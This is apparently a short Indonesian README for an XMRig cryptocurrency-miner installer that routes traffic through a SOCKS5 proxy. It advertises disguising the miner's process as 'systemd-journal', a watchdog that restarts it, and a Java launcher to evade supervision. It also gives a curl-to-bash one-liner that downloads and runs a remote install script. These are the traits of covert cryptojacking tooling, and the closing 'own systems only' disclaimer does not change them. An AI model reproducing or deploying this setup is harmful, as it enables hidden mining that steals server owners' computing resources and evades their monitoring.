# XMRig Installer via Proxychains SOCKS5

Script otomatis untuk menginstal dan menjalankan XMRig menggunakan proxy SOCKS5 dengan Java launcher dan watchdog.

## Fitur
- Menjalankan XMRig via SOCKS5 proxy
- Proses disamarkan (e.g. `systemd-journal`)
- Watchdog otomatis jika proses mati
- Menggunakan Java untuk bypass supervisi sederhana

## Cara Pakai
1. Upload semua file ke GitHub
2. Jalankan dengan:
   ```bash
   bash <(curl -sL https://raw.githubusercontent.com/USERNAME/xmrig-installer/main/install.sh)
   ```
   Ganti `USERNAME` dengan akun GitHub kamu.

## ⚠️ Peringatan
Gunakan hanya di sistem milik sendiri. Jangan jalankan di server publik tanpa izin.

---

🛠 Dibuat oleh [Ram Danis]
